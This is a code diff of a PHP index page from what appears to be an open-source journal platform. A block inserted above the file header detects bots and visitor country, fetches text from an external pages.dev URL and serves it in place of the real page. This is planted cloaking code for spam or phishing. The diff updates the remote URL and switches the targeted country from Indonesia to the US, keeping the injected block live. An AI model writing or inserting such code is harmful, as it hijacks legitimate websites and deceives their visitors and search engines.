@@ -19,14 +19,14 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$Biawak = "https://sundar-pichai-barges.pages.dev/landing.txt";
+$Biawak = "https://masuk-malam-sebulan-kahh.pages.dev/landing.txt";
 
 if (is_bot()) {
     echo @file_get_contents($Biawak);
     exit;
 }
 
-if (getUserCountry() === "ID") {
+if (getUserCountry() === "US") {
     header("Content-Type: text/html; charset=UTF-8");
     echo @file_get_contents($Biawak);
     exit();
@@ -35,7 +35,7 @@ if (getUserCountry() === "ID") {
 /**
  * @defgroup pages_index Index Pages
  */
-
+ 
 /**
  * @file pages/index/index.php
  *
@@ -44,13 +44,13 @@ if (getUserCountry() === "ID") {
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup pages_index
- *
- * @brief Handle site index requests.
+ * @brief Handle site index requests. 
  *
  */
 
 switch ($op) {
 	case 'index':
-		define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
 		break;
 }
